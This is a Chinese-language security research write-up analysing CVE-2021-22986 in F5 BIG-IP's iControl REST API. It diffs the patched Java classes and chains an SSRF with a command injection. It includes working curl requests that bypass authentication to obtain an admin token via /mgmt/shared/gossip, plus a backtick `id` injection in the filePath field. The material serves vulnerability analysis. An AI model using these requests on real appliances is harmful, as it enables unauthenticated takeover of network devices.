![image](https://image.3001.net/images/20210326/1616740741_605d81851cf79b1fcab35.jpg!small)

**作者：维阵漏洞研究员--w0lfzhang**

## 漏洞概述

前段时间F5的BIGIP爆出了一些漏洞，其中CVE-2021-22986是一个pre-auth的RCE漏洞，存在于其iControl
REST接口。其影响以下BIGIP的版本：

    
    
    16.0.0-16.0.1
    15.1.0-15.1.2
    14.1.0-14.1.3.1
    13.1.0-13.1.3.5
    12.1.0-12.1.5.2
    

在此特地简陋的分析下该漏洞以及利用方式。由于本人Java水平不是很高，如有错误，敬请指正。

## 漏洞定位

因为官方是没有放出漏洞具体详情的，所以需要自己根据patch来定位漏洞。刚开始我用的15.1.2和15.1.2.1的版本进行diff，没有diff出命令注入。后来换成16.0.1和16.0.1.1就diff出来了。所以本次分析用的是bigip
16.0.1和16.0.1.1的版本。

官方说漏洞存在于iControl
REST接口，查阅下[相关资料](https://cdn.f5.com/websites/devcentral.f5.com/downloads/icontrol-rest-api-user-guide-14-1-0.pdf)即可知如何访问该接口，默认是可通过443端口/mgmt/xxx路径进行访问。然后分析下httpd.conf可知对该路径的请求都会转发至localhost:8100进行处理：

    
    
    ...
    <ProxyMatch /mgmt/>
        # Access is restricted to traffic from 127.0.0.1
        Require ip 127.0.0.1
        Require ip 127.4.2.2
    
        # This is an exact copy of the authentication settings of the document root.
        # If a connection is attempted from anywhere but 127.*.*.*, then it will have
        # to be authenticated.
    
        # we control basic auth via this file...
        IncludeOptional /etc/httpd/conf/basic_auth*.conf
    
        AuthName "Enterprise Manager"
        AuthPAM_Enabled on
        AuthPAM_ExpiredPasswordsSupport on
        require valid-user
    </ProxyMatch>
    
    RewriteEngine on
    RewriteRule ^/mgmt$ /mgmt/ [PT]
    RewriteRule ^/mgmt(/vmchannel/.*) $1 [PT]
    
    # Don't proxy REST rpm endpoint requests.
    ProxyPass /mgmt/rpm !
    ProxyPass /mgmt/job !
    ProxyPass /mgmt/endpoint !
    # Proxy REST service bus requests.
    # We always retry so if we restart the REST service bus, Apache
    # will quickly re-discover it. (The default is 60 seconds.)
    # If you have retry timeout > 0, Apache timers may go awry
    # when clock is reset. It may never re-enable the proxy.
    ProxyPass /vmchannel/ http://localhost:8585/vmchannel/ retry=0
    ProxyPass /mgmt/ http://localhost:8100/mgmt/ retry=0
    # Adjust URLs in HTTP response headers
    ProxyPassReverse /vmchannel/ http://localhost:8585/vmchannel/
    ProxyPassReverse /mgmt/ http://localhost:8100/mgmt/
    ...
    

然后找到对应监听的主程序：

    
    
    [root@localhost:NO LICENSE:Standalone] config # ps aux |grep 8100
    root      6138  0.6  5.4 451568 220732 ?       Sl   Mar24   6:21 /usr/lib/jvm/jre/bin/java -Djava.util.logging.manager=com.f5.rest.common.RestLogManager -Djava.util.logging.config.file=/etc/restjavad.log.conf -Dlog4j.defaultInitOverride=true -Dorg.quartz.properties=/etc/quartz.properties -Xss384k -XX:+PrintFlagsFinal -Dsun.jnu.encoding=UTF-8 -Df......
    

分析该启动命令行可知，主类为com.f5.rest.workers.RestWorkerHost，大致知道下相关的jar文件都位于/usr/share/java/rest目录下。在diff一些文件大小和时间经过改变的jar文件后，最终在f5.rest.workers.authn.AuthnWorker和com.f5.rest.tmos.bigip.access.iapp.IAppBundleInstallTaskCollectionWorker中发现了一些变化：

    
    
    f5.rest.workers.authn.AuthnWorker:
    protected void onPost(final RestOperation request) {
         final String incomingAddress = request.getRemoteSender();
    
         final AuthnWorkerState state = (AuthnWorkerState)request.getTypedBody(AuthnWorkerState.class);
         AuthProviderLoginState loginState = (AuthProviderLoginState)request.getTypedBody(AuthProviderLoginState.class);
    
    
    -    if (state.password == null && state.bigipAuthCookie == null) {
    +    if (Utilities.isNullOrEmpty(state.password) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {
           state.bigipAuthCookie = request.getCookie("BIGIPAuthCookie");
           loginState.bigipAuthCookie = state.bigipAuthCookie;
         }
    
         if (incomingAddress != null && incomingAddress != "Unknown") {
           loginState.address = incomingAddress;
         }
    
    -    if ((state.username == null || state.password == null) && state.bigipAuthCookie == null) {
    +    if ((Utilities.isNullOrEmpty(state.username) || Utilities.isNullOrEmpty(state.password)) && Utilities.isNullOrEmpty(state.bigipAuthCookie)) {
    +
           request.setStatusCode(401);
           String msg = String.format("username and password must not be null or %s in Cookie header should be used.", new Object[] { "BIGIPAuthCookie" });
    
           request.fail(new SecurityException(msg));
    
    +
           return;
         }
    
    +    boolean isAllowedLinks = false;
    +
    +    if (state.loginReference != null && state.loginReference.link != null) {
    +
    +      for (URI iter : this.subscriptions.keySet()) {
    +        if (state.loginReference.link.getPath().equals(iter.getPath())) {
    +          isAllowedLinks = true;
    +          break;
    +        }
    +      }
    +      if (!isAllowedLinks) {
    +        getLogger().severe("No login provider found.");
    +        String msg = String.format("No login provider found.", new Object[0]);
    +        request.fail(new SecurityException(msg));
    +
    +        return;
    +      }
    +    }
    +
         state.password = null;
         request.setBody(state);
    ...
    
    com.f5.rest.tmos.bigip.access.iapp.IAppBundleInstallTaskCollectionWorker:
    +  private static final Pattern validFilePathChars = Pattern.compile("(^[a-zA-Z][a-zA-Z0-9_.\\-\\s()]*)\\.([tT][aA][rR]\\.[gG][zZ])$");
    ...
       private void validateGzipBundle(final IAppBundleInstallTaskState taskState) {
         if (Utilities.isNullOrEmpty(taskState.filePath)) {
           File agcUseCasePackDir = new File("/var/apm/f5-iappslx-agc-usecase-pack/");
           if (!agcUseCasePackDir.exists() || !agcUseCasePackDir.isDirectory()) {
             String error = "Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.";
             failTask(taskState, error, "");
             return;
           }
           File[] agcUseCasePack = agcUseCasePackDir.listFiles();
           if (agcUseCasePack == null || agcUseCasePack.length == 0 || !agcUseCasePack[0].isFile()) {
    
             String error = "Access Guided Configuration use case pack not found on BIG-IP. Please upload and install the pack.";
             failTask(taskState, error, "");
             return;
           }
           taskState.filePath = agcUseCasePack[0].getPath();
         }
    
    +    String filename = taskState.filePath.substring(taskState.filePath.lastIndexOf('/') + 1);
    +    Matcher m = validFilePathChars.matcher(filename);
    +    if (!m.matches()) {
    +      String errorMessage = String.format("Access Guided Configuration use case pack validation failed: the file name %s must begin with alphabet, and only contain letters, numbers, spaces and/or special characters (underscore (_), period (.), hyphen (-) and round brackets ()). Only a .tar.gz file is allowed", new Object[] { filename });
    +
    +
    +
    +      failTask(taskState, errorMessage, "");
    +
    +      return;
    +    }
         final String extractTarCommand = "tar -xf " + taskState.filePath + " -O > /dev/null";
    
    
         ShellExecutor extractTar = new ShellExecutor(extractTarCommand);
    ...
    

结合下该[链接](https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986)的分析，可知第一个漏洞为一个SSRF漏洞。但是利用该漏洞有一些限制，稍后会提到。第二个漏洞为一个命令注入漏洞。

## 漏洞利用

SSRF影响的路径为/mgmt/shared/authn/login，命令注入影响路径为/mgmt/tm/access/bundle-install-tasks。查看f5.rest.workers.authn.AuthnWorker类可知，在访问/mgmt/shared/authn/login路径的时候如果POST数据中有loginReference字段，且满足以下条件会把该请求连带POST数据转发至该loginReference字段的link路径。

    
    
    .......
      if (state.password == null && state.bigipAuthCookie == null) {
    /* 323 */       state.bigipAuthCookie = request.getCookie("BIGIPAuthCookie");
    /* 324 */       loginState.bigipAuthCookie = state.bigipAuthCookie;
    /*     */     } 
    /*     */
    /* 327 */     if (incomingAddress != null && incomingAddress != "Unknown") {
    /* 328 */       loginState.address = incomingAddress;
    /*     */     }
    /*     */
    /* 331 */     if ((state.username == null || state.password == null) && state.bigipAuthCookie == null) {
    /* 332 */       request.setStatusCode(401);
    /* 333 */       String msg = String.format("username and password must not be null or %s in Cookie header should be used.", new Object[] { "BIGIPAuthCookie" });
    /*     */
    /* 335 */       request.fail(new SecurityException(msg));
    /*     */
    /*     */       return;
    /*     */     } 
    ......
    

但是对该POST数据的字段是有白名单限制的。在转发该请求之前，请求的POST数据会被重新设置：

    
    
    /* 318 */     final AuthnWorkerState state = (AuthnWorkerState)request.getTypedBody(AuthnWorkerState.class);
    /* 319 */     AuthProviderLoginState loginState = (AuthProviderLoginState)request.getTypedBody(AuthProviderLoginState.class);
                  ......
    /* 503 */     RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);
    /*     */ 
    /*     */
    /* 506 */     sendPost(checkAuth);
    /*     */   }
    

可以看到会根据loginState来进行setbody，亦即设置POST数据。只允许AuthProviderLoginState的字段：

    
    
    public class AuthProviderLoginState extends RestWorkerState {
      public String username;
    
      public String password;
    
      public String address;
    
      public String bigipAuthCookie;
    
      public String authProviderName;
    
      public RestReference userReference;
    
      public List<RestReference> groupReferences;
    }
    

所以如果直接利用SSRF来进行命令注入的话，不符合的字段是传不到目标url的。

    
    
    curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'
    

![1616996684_6061694cd6379e24de684.png!small?1616996685202](https://image.3001.net/images/20210329/1616996684_6061694cd6379e24de684.png!small?1616996685202)

当该url处理完成后如果未发生异常默认会继续执行以下class的completed方法：

    
    
    RestOperation checkAuth = RestOperation.create().setBody(loginState).setUri(makeLocalUri(state.loginReference.link)).setCompletion(authCompletion);
    
    RestRequestCompletion authCompletion = new RestRequestCompletion()
    /*     */       {
    /*     */
    /*     */        ......
    /*     */         public void completed(RestOperation operation) {
    /* 483 */           AuthnWorker.this.loginFailureMap.remove(failureKey);
    /*     */
    /* 485 */           AuthProviderLoginState loggedIn = (AuthProviderLoginState)operation.getTypedBody(AuthProviderLoginState.class);
    /*     */ 
    /*     */
    /* 488 */           String authProviderId = loggedIn.authProviderName;
    /* 489 */           if (authProviderId == null) {
    /* 490 */             authProviderId = (state.loginProviderName == null) ? state.loginReference.link.toString() : state.loginProviderName;
    /*     */           }
    /*     */ 
    /*     */
    /* 494 */           AuthnWorker.this.getLogger().finestFmt("User %s successfully logged in from %s using the %s authentication provider.", new Object[] { loggedIn.username, this.val$incomingAddress, authProviderId });
    /* 499 */           AuthnWorker.generateToken(AuthnWorker.this.getServer(), request, state, loggedIn);
    /*     */         }
    /*     */       };
    

访问该url(mgmt/tm/access/bundle-install-tasks)返回的json数据会根据字段赋值给loggedIn(class
AuthProviderLoginState)的各个字段：  
![1616996750_6061698e217f51d550017.png!small?1616996750420](https://image.3001.net/images/20210329/1616996750_6061698e217f51d550017.png!small?1616996750420)

然后就会调用generateToken函数，根据函数名以及分析可知该函数可以产生登录时的token，然后用该token即可访问需要认证的资源。所以如果一切正常的话，上述访问应该给我们返回一个token，但实际上返回的是以下内容：

    
    
    ➜  CVE-2021-22986 ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/tm/access/bundle-install-tasks"},"filePath":"`id`"}'
    {"code":400,"message":"request failed with null exception","referer":"192.168.190.1","restOperationId":7145511,"kind":":resterrorresponse"}
    

所以需要分析下token获取失败的原因。审计java代码可发现token的产生是在AuthTokenWorker
class里面，在关键代码处下断点后可发现token获取失败的原因，因为state.user为null。  
![1616996789_606169b5b00a55bcf938a.png!small?1616996790042](https://image.3001.net/images/20210329/1616996789_606169b5b00a55bcf938a.png!small?1616996790042)

传进去的state.user字段是在generateToken函数里面进行赋值的：

    
    
    /*     */   public static void generateToken(RestServer server, final RestOperation request, final AuthnWorkerState authState, AuthProviderLoginState loginState) {
    /* 516 */     if (authState.needsToken != null && !authState.needsToken.booleanValue()) {
    /* 517 */       request.setBody(authState);
    /* 518 */       request.complete();
    /*     */
    /*     */       return;
    /*     */     } 
    /* 522 */     AuthTokenItemState token = new AuthTokenItemState();
    /* 523 */     token.userName = loginState.username;
    /* 524 */     token.user = loginState.userReference;
    /* 525 */     token.groupReferences = loginState.groupReferences;
    /* 526 */     token.authProviderName = loginState.authProviderName;
    /* 527 */     token.address = request.getXForwarderdFor();
    ......
    /* 547 */     RestOperation createToken = RestOperation.create().setUri(UrlHelper.buildLocalUriSafe(server, new String[] { WellKnownPorts.AUTHZ_TOKEN_WORKER_URI_PATH })).setBody(token).setCompletion(tokenCompletion).setReferer("authn-generate-token");  <====
    /*     */
    /* 553 */     RestRequestSender.sendPost(createToken);
    ......
    

![1616996845_606169ededd26abc700fd.png!small?1616996846362](https://image.3001.net/images/20210329/1616996845_606169ededd26abc700fd.png!small?1616996846362)

根据前面分析可知，loginState各字段的赋值来源于对目标url访问返回的json数据。而此时我们传进去的userReference字段是null的，所以触发了state.user==null，获取token会失败，这是最根本的原因。

所以要想正常获取token需要我们利用ssrf访问的url返回的json数据包含userReference字段。只需要找到一个能返回userReference字段的worker(url)即可。

在经过查找后，gossip worker(/mgmt/shared/gossip)符合条件：

    
    
    ➜  CVE-2021-22986 ✗ curl -ksu admin:xxx https://192.168.190.136/mgmt/shared/gossip -d '{"userReference":{"link"
    :"xxx"}'
    {"userReference":{"link":"xxx"}
    

所以利用ssrf访问该url可正常获取token：

    
    
    ➜  CVE-2021-22986 ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"username":"admin","bigipAuthCooki
    e":"","userReference":{"link":""},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}'
    {"username":"admin","bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/shared/gossip"},"token":{"token":"GFCDZ5OHG26QRMFKKETVAV2M6Q","name":"GFCDZ5OHG26QRMFKKETVAV2M6Q","userName":"admin","user":{"link":""},"timeout":1200,"startTime":"2021-03-25T07:51:35.742-0700","address":"192.168.190.1","partition":"[All]","generation":1,"lastUpdateMicros":1616683895741691,"expirationMicros":1616685095742000,"kind":"shared:authz:tokens:authtokenitemstate","selfLink":"https://localhost/mgmt/shared/authz/tokens/GFCDZ5OHG26QRMFKKETVAV2M6Q"},"generation":0,"lastUpdateMicros":0}
    

需要注意的是虽然username字段不指定时也可产生token，但此token是没有权限的。

    
    
    ➜  CVE-2021-22986 git:(master) ✗ curl -ks https://192.168.190.136/mgmt/shared/authn/login -d '{"username":"","bigipAuthCookie":"","userReference":{"link":""},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}'
    {"username":"","bigipAuthCookie":"","loginReference":{"link":"http://localhost/mgmt/shared/gossip"},"token":{"token":"F7B7234EB5G2DAZPKYZJZZE6I3","name":"F7B7234EB5G2DAZPKYZJZZE6I3","userName":"","user":{"link":""},"timeout":1200,"startTime":"2021-03-25T08:01:02.827-0700","address":"192.168.190.1","partition":"[All]","generation":1,"lastUpdateMicros":1616684462826871,"expirationMicros":1616685662827000,"kind":"shared:authz:tokens:authtokenitemstate","selfLink":"https://localhost/mgmt/shared/authz/tokens/F7B7234EB5G2DAZPKYZJZZE6I3"},"generation":0,"lastUpdateMicros":0}
    

所以实际上利用该url需要知道管理员用户名才行，但是设备默认管理员用户名就是admin，且好像不可更改和删除，问题不大。获取token后然后结合命令注入即可达到RCE的效果。  
![1616996883_60616a1374824a0d45401.png!small?1616996883847](https://image.3001.net/images/20210329/1616996883_60616a1374824a0d45401.png!small?1616996883847)

